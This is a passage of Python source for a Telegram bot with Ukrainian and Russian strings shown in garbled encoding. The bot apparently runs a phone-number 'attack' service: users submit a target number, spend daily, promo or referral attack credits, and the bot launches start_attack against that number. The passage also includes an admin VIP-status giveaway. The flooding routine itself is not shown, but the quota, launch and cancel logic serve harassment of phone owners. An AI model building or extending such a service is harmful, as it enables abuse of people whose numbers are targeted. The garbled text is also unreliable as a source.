                logging.info(f"–°–ø–∏—Å–∞–Ω–æ 1 —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—É –∞—Ç–∞–∫—É –¥–ª—è user_id={user_id}, –±—É–ª–æ: {referral_attacks}, —Å—Ç–∞–ª–æ: {new_value}")
            elif promo_attacks > 0:
                await conn.execute(
                    'UPDATE users SET promo_attacks = GREATEST(0, COALESCE(promo_attacks, 0) - 1), last_attack_date = $1 WHERE user_id = $2',
                    get_kyiv_datetime(), user_id
                )
                # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —â–æ –∑–º—ñ–Ω–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–ª–∏—Å—è
                new_value = await conn.fetchval('SELECT promo_attacks FROM users WHERE user_id = $1', user_id)
                logging.info(f"–°–ø–∏—Å–∞–Ω–æ 1 –ø—Ä–æ–º–æ –∞—Ç–∞–∫—É –¥–ª—è user_id={user_id}, –±—É–ª–æ: {promo_attacks}, —Å—Ç–∞–ª–æ: {new_value}")
            else:
                # –Ø–∫—â–æ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏—Ö —ñ –ø—Ä–æ–º–æ –Ω–µ–º–∞—î (–∞–±–æ = 0), —Å–ø–∏—Å—É—î–º–æ –∑–≤–∏—á–∞–π–Ω—ñ
                # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ —î –∑–≤–∏—á–∞–π–Ω—ñ –∞—Ç–∞–∫–∏ (–≤–æ–Ω–∏ –º–∞—é—Ç—å –±—É—Ç–∏, –±–æ total_attacks > 0)
                if attacks_left > 0:
                    await conn.execute(
                        'UPDATE users SET attacks_left = GREATEST(0, COALESCE(attacks_left, 0) - 1), last_attack_date = $1 WHERE user_id = $2',
                        get_kyiv_datetime(), user_id
                    )
                    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —â–æ –∑–º—ñ–Ω–∏ –∑–∞—Å—Ç–æ—Å—É–≤–∞–ª–∏—Å—è
                    new_value = await conn.fetchval('SELECT attacks_left FROM users WHERE user_id = $1', user_id)
                    logging.info(f"–°–ø–∏—Å–∞–Ω–æ 1 –∑–≤–∏—á–∞–π–Ω—É –∞—Ç–∞–∫—É –¥–ª—è user_id={user_id}, –±—É–ª–æ: {attacks_left}, —Å—Ç–∞–ª–æ: {new_value}")
                else:
                    logging.error(f"–ö–†–ò–¢–ò–ß–ù–ê –ü–û–ú–ò–õ–ö–ê: total_attacks={total_attacks} > 0, –∞–ª–µ –≤—Å—ñ —Ç–∏–ø–∏ –∞—Ç–∞–∫ = 0! (attacks_left={attacks_left}, promo_attacks={promo_attacks}, referral_attacks={referral_attacks})")
                    await message.answer("‚ùå –ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ —Å–ø–∏—Å–∞–Ω–Ω—ñ –∞—Ç–∞–∫. –ó–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
                    return
        
        # –ü–æ–∑–Ω–∞—á–∞—î–º–æ —â–æ –∞—Ç–∞–∫–∞ –∞–∫—Ç–∏–≤–Ω–∞ –¥–ª—è —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–≤ private —á–∞—Ç–∞—Ö chat_id == user_id)
        active_attacks[chat_id] = True
        cancel_keyboard = get_cancel_keyboard()
        attack_flags[chat_id] = True 
        status_msg = await message.answer(
            f'üéØ –ú—ñ—Å—ñ—è —Ä–æ–∑–ø–æ—á–∞—Ç–∞!\n\nüì± –¶—ñ–ª—å: <i>{number}</i>\n\n‚ö° –°—Ç–∞—Ç—É—Å: –í –ø—Ä–æ—Ü–µ—Å—ñ...',
            parse_mode="html",
            reply_markup=get_cancel_keyboard()
        )
        last_status_msg[chat_id] = status_msg.message_id

        asyncio.create_task(start_attack(number, chat_id))
    else:
        await message.answer("–ù–µ–≤—ñ—Ä–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –Ω–æ–º–µ—Ä–∞.\n–í–≤–µ–¥—ñ—Ç—å –Ω–æ–º–µ—Ä –ø–æ–≤—Ç–æ—Ä–Ω–æ.\n–ü—Ä–∏–∫–ª–∞–¥: <i>üá∫üá¶380XXXXXXXXX</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    # –í–∏–¥–∞–ª—è—î–º–æ –∞–∫—Ç–∏–≤–Ω—É –∞—Ç–∞–∫—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–≤ private —á–∞—Ç–∞—Ö chat_id == user_id)
    active_attacks.pop(chat_id, None)
    await callback_query.answer("–ó—É–ø–∏–Ω—è—î–º–æ...")
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text("üõë –ó—É–ø–∏–Ω—è—î–º–æ –∞—Ç–∞–∫—É...", chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass

async def reset_daily_attacks():
    """–í—ñ–¥–Ω–æ–≤–ª—é—î –∞—Ç–∞–∫–∏ –¥–ª—è –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –æ 00:00 –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º"""
    if not db_pool:
        return
    
    today = get_kyiv_date()
    kyiv_now = get_kyiv_datetime()
    
    try:
        async with db_pool.acquire() as conn:
            # –û—Ç—Ä–∏–º—É—î–º–æ –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, —É —è–∫–∏—Ö last_attack_date –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ —Å—å–æ–≥–æ–¥–Ω—ñ
            updated_count = await conn.execute(
                """
                UPDATE users 
                SET attacks_left = 30, 
                    referral_attacks = 0, 
                    unused_referral_attacks = 0, 
                    last_attack_date = $1
                WHERE last_attack_date::date != $2 OR last_attack_date IS NULL
                """,
                kyiv_now, today
            )
            
            # updated_count —É asyncpg –º—ñ—Å—Ç–∏—Ç—å —Ä—è–¥–æ–∫ —Ç–∏–ø—É "UPDATE 15", –¥–µ 15 - –∫—ñ–ª—å–∫—ñ—Å—Ç—å –æ–Ω–æ–≤–ª–µ–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤
            count = updated_count.split()[-1] if updated_count else "0"
            logging.info(f"–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫ –æ 00:00: –æ–Ω–æ–≤–ª–µ–Ω–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤: {count}")
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–º—É –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—ñ –∞—Ç–∞–∫: {e}")

async def daily_attacks_reset_scheduler():
    """–§–æ–Ω–æ–≤–∏–π task, —è–∫–∏–π –ø–µ—Ä–µ–≤—ñ—Ä—è—î —á–∞—Å —ñ –≤—ñ–¥–Ω–æ–≤–ª—é—î –∞—Ç–∞–∫–∏ –æ 00:00"""
    last_reset_date = None
    
    def get_kyiv_now():
        """–ü–æ–≤–µ—Ä—Ç–∞—î –ø–æ—Ç–æ—á–Ω–∏–π datetime –∑ –∫–∏—ó–≤—Å—å–∫–∏–º timezone"""
        if ZoneInfo:
            kyiv_tz = ZoneInfo("Europe/Kyiv")
            return datetime.now(kyiv_tz)
        elif pytz:
            kyiv_tz = pytz.timezone("Europe/Kyiv")
            return datetime.now(kyiv_tz)
        else:
            return datetime.now()
    
    while True:
        try:
            # –û—Ç—Ä–∏–º—É—î–º–æ –∫–∏—ó–≤—Å—å–∫–∏–π —á–∞—Å –∑ timezone
            now = get_kyiv_now()
            current_date = now.date()
            current_hour = now.hour
            current_minute = now.minute
            
            # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ —á–∏ –Ω–∞—Å—Ç–∞–≤ –Ω–æ–≤–∏–π –¥–µ–Ω—å (00:00-00:01)
            # —ñ —á–∏ —â–µ –Ω–µ –≤–∏–∫–æ–Ω—É–≤–∞–ª–æ—Å—å –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –Ω–∞ —Ü—é –¥–∞—Ç—É
            if current_hour == 0 and current_minute < 2:
                if last_reset_date != current_date:
                    logging.info(f"–ó–∞–ø—É—Å–∫ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫ –æ {now.strftime('%H:%M:%S')} –∑–∞ –∫–∏—ó–≤—Å—å–∫–∏–º —á–∞—Å–æ–º")
                    await reset_daily_attacks()
                    last_reset_date = current_date
            else:
                # –Ø–∫—â–æ –Ω–µ 00:00, —Å–∫–∏–¥–∞—î–º–æ last_reset_date —â–æ–± –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –¥–Ω—è –∑–Ω–æ–≤—É –≤—ñ–¥–Ω–æ–≤–∏—Ç–∏
                if last_reset_date and last_reset_date != current_date:
                    last_reset_date = None
            
            # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –∫–æ–∂–Ω—É —Ö–≤–∏–ª–∏–Ω—É
            await asyncio.sleep(60)
        except Exception as e:
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –≤ scheduler –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫: {e}")
            await asyncio.sleep(60)

async def check_attack_limits(user_id: int):
    today = get_kyiv_date()
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow(
            "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date FROM users WHERE user_id = $1",
            user_id
        )
        
        if not result:
            return False, 0, 0, 0
        
        attacks_left = result['attacks_left']
        promo_attacks = result['promo_attacks']
        referral_attacks = result['referral_attacks']
        unused_referral_attacks = result['unused_referral_attacks']
        last_attack_date = result['last_attack_date']
        
        # –ü—Ä–∏–≤–æ–¥–∏–º last_attack_date –∫ –¥–∞—Ç–µ –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
        if last_attack_date:
            last_attack_date_only = last_attack_date.date()
        else:
            last_attack_date_only = today
        
        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –ø–æ—Ç—Ä—ñ–±–Ω–æ —Å–∫–∏–Ω—É—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –Ω–æ–≤–∏–π –¥–µ–Ω—å
        if last_attack_date_only != today:
            # –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ñ –∞—Ç–∞–∫–∏ —Å–∫–∏–¥–∞—é—Ç—å—Å—è (–≤–æ–Ω–∏ –¥—ñ–π—Å–Ω—ñ —Ç—ñ–ª—å–∫–∏ –Ω–∞ –æ–¥–∏–Ω –¥–µ–Ω—å)
            # –°–∫–∏–¥–∞—î–º–æ –∑–≤–∏—á–∞–π–Ω—ñ –∞—Ç–∞–∫–∏ –Ω–∞ 30 (–º–∞–∫—Å–∏–º—É–º –Ω–∞ –¥–µ–Ω—å)
            new_attacks = 30
            kyiv_now = get_kyiv_datetime()
            await conn.execute(
                "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                new_attacks, kyiv_now, user_id
            )
            attacks_left = new_attacks
            referral_attacks = 0
            unused_referral_attacks = 0
        elif attacks_left is None or attacks_left < 0:
            # –Ø–∫—â–æ –∑–Ω–∞—á–µ–Ω–Ω—è NULL –∞–±–æ –Ω–µ–≥–∞—Ç–∏–≤–Ω–µ - –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î–º–æ 30
            # –¶–µ –≤–∏–ø—Ä–∞–≤–ª—è—î —Å–∏—Ç—É–∞—Ü—ñ—ó, –∫–æ–ª–∏ –≤ –±–∞–∑—ñ –±—É–ª–æ –Ω–µ–∫–æ—Ä–µ–∫—Ç–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è
            new_attacks = 30
            await conn.execute(
                "UPDATE users SET attacks_left = $1 WHERE user_id = $2",
                new_attacks, user_id
            )
            attacks_left = new_attacks
        
        total_attacks = attacks_left + promo_attacks + referral_attacks
        can_attack = total_attacks > 0
        
        return can_attack, attacks_left, promo_attacks, referral_attacks

async def user_exists(user_id: int) -> bool:
    """
    –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
    """
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT 1 FROM users WHERE user_id = $1', user_id)
    return result is not None

# –†–û–ó–´–ì–†–´–® VIP-–°–¢–ê–¢–£–°–ê

# –£–¥–∞–ª–∏—Ç—å —ç—Ç–æ—Ç –æ–±—Ä–∞–±–æ—Ç—á–∏–∫:
# @dp.message_handler(lambda message: message.chat.type in ['group', 'supergroup'] and message.text and f'@{bot._me.username}' in message.text if hasattr(bot, '_me') else False)

# –î–æ–±–∞–≤–∏—Ç—å –≤–º–µ—Å—Ç–æ –Ω–µ–≥–æ inline-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏:

@dp.inline_handler()
async def inline_giveaway(inline_query: types.InlineQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ inline-–∑–∞–ø—Ä–æ—Å–æ–≤ –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞"""
    user_id = inline_query.from_user.id
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ inline-–∑–∞–ø–∏—Ç –π–¥–µ –∑ –≥—Ä—É–ø–æ–≤–æ–≥–æ —á–∞—Ç—É
    # –Ø–∫—â–æ inline –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –æ—Å–æ–±–∏—Å—Ç–æ–º—É —á–∞—Ç—ñ - –Ω–µ –ø–æ–∫–∞–∑—É—î–º–æ —Ä–æ–∑—ñ–≥—Ä–∞—à
    if inline_query.chat_type not in ['group', 'supergroup']:
        results = [
            types.InlineQueryResultArticle(
                id='group_only',
                title='üé™ –¢—ñ–ª—å–∫–∏ –¥–ª—è –≥—Ä—É–ø',
                description='–†–æ–∑—ñ–≥—Ä–∞—à –¥–æ—Å—Ç—É–ø–Ω–∏–π —Ç—ñ–ª—å–∫–∏ –≤ –≥—Ä—É–ø–æ–≤–∏—Ö —á–∞—Ç–∞—Ö',
                input_message_content=types.InputTextMessageContent(
                    message_text='üé™ –†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É –¥–æ—Å—Ç—É–ø–Ω–∏–π –ª–∏—à–µ –≤ –≥—Ä—É–ø–æ–≤–∏—Ö —á–∞—Ç–∞—Ö!'
                )
            )
        ]
        await bot.answer_inline_query(inline_query.id, results, cache_time=1)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –ø—Ä–∞–≤–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
    if user_id not in ADMIN:
        # –î–ª—è –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø–æ–∫–∞–∑—ã–≤–∞–µ–º "–æ—Ç–∫–∞–∑"
        results = [
            types.InlineQueryResultArticle(
                id='no_access',
                title='üé™ –ù–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É',
                description='–¢—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ',
                input_message_content=types.InputTextMessageContent(
                    message_text='üé™ –¢—ñ–ª—å–∫–∏ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∏ –º–æ–∂—É—Ç—å –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ!'
                )
            )
        ]
    else:
        # –î–ª—è –∞–¥–º–∏–Ω–æ–≤ –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É —Ä–æ–∑—ã–≥—Ä—ã—à–∞
        results = [
            types.InlineQueryResultArticle(
                id='start_giveaway',
                title='üé™ –†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É',
                description='–í–∏–∑–Ω–∞—á–∏—Ç–∏ –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è —Å–µ—Ä–µ–¥ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤',
                input_message_content=types.InputTextMessageContent(
                    message_text='üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n–ì–æ—Ç–æ–≤–∏–π –æ–±—Ä–∞—Ç–∏ –≤–∏–ø–∞–¥–∫–æ–≤–æ–≥–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è —Å–µ—Ä–µ–¥ —É—Å—ñ—Ö –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –±–æ—Ç–∞!\n–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –∫–Ω–æ–ø–∫—É –Ω–∏–∂—á–µ, —â–æ–± –∑–∞–ø—É—Å—Ç–∏—Ç–∏ —Ä–æ–∑—ñ–≥—Ä–∞—à üé≤',
                    parse_mode='HTML'
                ),
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("üé™ –í–∏–∑–Ω–∞—á–∏—Ç–∏ –ø–µ—Ä–µ–º–æ–∂—Ü—è", callback_data="start_giveaway")
                )
            )
        ]
    
    await bot.answer_inline_query(inline_query.id, results, cache_time=1)

@dp.callback_query_handler(lambda c: c.data == "start_giveaway")
async def start_giveaway(callback_query: types.CallbackQuery):
    """–ó–∞–ø—É—Å–∫ —Ä–æ–∑—ã–≥—Ä—ã—à–∞ VIP-—Å—Ç–∞—Ç—É—Å–∞"""
    user_id = callback_query.from_user.id
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –ø—Ä–∞–≤–∞
    if user_id not in ADMIN:
        await callback_query.answer("üö´ –ù–µ–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∞–≤!", show_alert=True)
        return
    
    # –û—Ç—Ä–∏–º—É—î–º–æ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —á–∞—Ç –∑ inline_message_id –∞–±–æ message
    chat_id = None
    message_id = None
    
    if callback_query.message:
        chat_id = callback_query.message.chat.id
        message_id = callback_query.message.message_id
        chat_type = callback_query.message.chat.type
    elif callback_query.inline_message_id:
        # –î–ª—è inline-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –∑–∞–ø—É—Å–∫–∞—î–º–æ –ø–æ–≤–Ω—É –∞–Ω—ñ–º–∞—Ü—ñ—é
        await callback_query.answer("üé∞ –ó–∞–ø—É—Å–∫–∞—é —Ä–æ–∑—ã–≥—Ä—ã—à...")
        
        # –û—Ç—Ä–∏–º—É—î–º–æ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # –§—ñ–ª—å—Ç—Ä—É—î–º–æ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # –ó–∞–ø—É—Å–∫–∞—î–º–æ –∞–Ω—ñ–º–∞—Ü—ñ—é –¥–ª—è inline-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        await run_inline_giveaway_animation(callback_query.inline_message_id, active_users)
        return
    else:
        await callback_query.answer("‚ùå –ü–æ–º–∏–ª–∫–∞: –Ω–µ –≤–¥–∞–ª–æ—Å—è –≤–∏–∑–Ω–∞—á–∏—Ç–∏ —á–∞—Ç!", show_alert=True)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —â–æ —Ü–µ –≥—Ä—É–ø–æ–≤–∏–π —á–∞—Ç
    if chat_type not in ['group', 'supergroup']:
        await callback_query.answer("üö´ –†–æ–∑—ã–≥—Ä—ã—à –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –≤ –≥—Ä—É–ø–ø–æ–≤—ã—Ö —á–∞—Ç–∞—Ö!", show_alert=True)
        return
    
    # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ, —á–∏ –Ω–µ –π–¥–µ –≤–∂–µ —Ä–æ–∑—ñ–≥—Ä–∞—à
    if giveaway_flags.get(chat_id):
        await callback_query.answer("‚è≥ –†–æ–∑—ã–≥—Ä—ã—à —É–∂–µ –∏–¥–µ—Ç!", show_alert=True)
        return
    
    await callback_query.answer("üé∞ –ó–∞–ø—É—Å–∫–∞—é —Ä–æ–∑—ã–≥—Ä—ã—à...")
    giveaway_flags[chat_id] = True
    
    try:
        # –û—Ç—Ä–∏–º—É—î–º–æ —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # –§—ñ–ª—å—Ç—Ä—É—î–º–æ –∞–∫—Ç–∏–≤–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (—Ç–µ—Ö, –∫—Ç–æ –Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –±–æ—Ç–∞)
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞!",
                chat_id=chat_id,
                message_id=message_id
            )
            return
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –∞–Ω–∏–º–∞—Ü–∏—é –ø–æ–∏—Å–∫–∞
        await run_giveaway_animation(chat_id, message_id, active_users)
        
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ –≤ —Ä–æ–∑—ñ–≥—Ä–∞—à—ñ: {e}")
        try:
            await bot.edit_message_text(
                "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ñ —Ä–æ–∑—ñ–≥—Ä–∞—à—É!",
                chat_id=chat_id,
                message_id=message_id
            )
        except Exception as edit_error:
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è: {edit_error}")
            try:
                await bot.send_message(chat_id, "‚ùå –°—Ç–∞–ª–∞—Å—è –ø–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—ñ —Ä–æ–∑—ñ–≥—Ä–∞—à—É!")
            except Exception as send_error:
                logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è: {send_error}")
    finally:
        giveaway_flags[chat_id] = False

async def run_giveaway_animation(chat_id: int, message_id: int, active_users: list):
    """–ê–Ω–∏–º–∞—Ü–∏—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞ —Å –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–æ–º"""
    import random
    
    # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∞–Ω—ñ–º–∞—Ü—ñ—ó
    search_messages = [
        "üé™ –ü–µ—Ä–µ–º–µ—à–∏–≤–∞—é —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤...",
        "‚ö° –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª...",
        "üé≤ –ö—Ä—É—Ç–∏—Ç—Å—è –∫–æ–ª–µ—Å–æ —Ñ–æ—Ä—Ç—É–Ω—ã...",
        "üéØ –ü–æ—á—Ç–∏ –≥–æ—Ç–æ–≤–æ...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # —Å–µ–∫—É–Ω–¥–∞ –Ω–∞ —à–∞–≥
    
    for step in range(total_steps):
        if not giveaway_flags.get(chat_id):
            return
        
        # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–≥—Ä–µ—Å-–±–∞—Ä
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "‚ñì" * filled + "‚ñë" * empty
        percentage = (step + 1) * 25     
        # –í–∏–±–∏—Ä–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # –û–Ω–æ–≤–ª—é—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        text = f"üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\nüë• –£—á–∞—Å–Ω–∏–∫—ñ–≤: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –∫—Ä–æ—Ü—ñ {step}: {e}")
            # –Ø–∫—â–æ –Ω–µ –º–æ–∂–µ–º–æ —Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏, –ø—Ä–æ–ø—É—Å–∫–∞—î–º–æ —Ü–µ–π –∫—Ä–æ–∫
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # –í–∏–±–∏—Ä–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è
    winner = random.choice(active_users)
    winner_name = winner['name'] or "–ë–µ–∑ –∏–º–µ–Ω–∏"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # –§–æ—Ä–º—É—î–º–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ—Ñ—ñ–ª—å
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
        display_name = f"{winner_name} (@{winner_username})"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
        display_name = winner_name
    
    # –§—ñ–Ω–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    final_text = (
